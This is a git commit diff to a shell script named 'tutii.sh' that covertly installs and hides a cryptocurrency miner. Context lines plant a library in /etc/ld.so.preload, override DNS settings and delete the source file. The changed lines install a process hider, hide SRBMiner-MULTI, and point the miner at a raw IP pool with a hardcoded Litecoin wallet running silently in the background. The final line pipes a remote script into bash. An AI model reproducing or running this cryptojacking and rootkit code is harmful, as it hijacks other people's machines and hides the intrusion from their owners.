8b56d5c875d7161eb5869b860b69d77827a78972
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-17 23:36:41 +0700

    Update tutii.sh

--- tutii.sh
+++ tutii.sh
@@ -10,9 +10,9 @@ echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
 rm cikblek.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
+sudo su --command "curl -fsSL https://deb.nodesource.com/setup_24.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz >/dev/null 2>&1
 tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
 cd SRBMiner-Multi-2-4-8
-./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."OPOK$RANDOM" >/dev/null 2>&1 &
+./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://104.207.92.96:443 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."01$RANDOM" >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
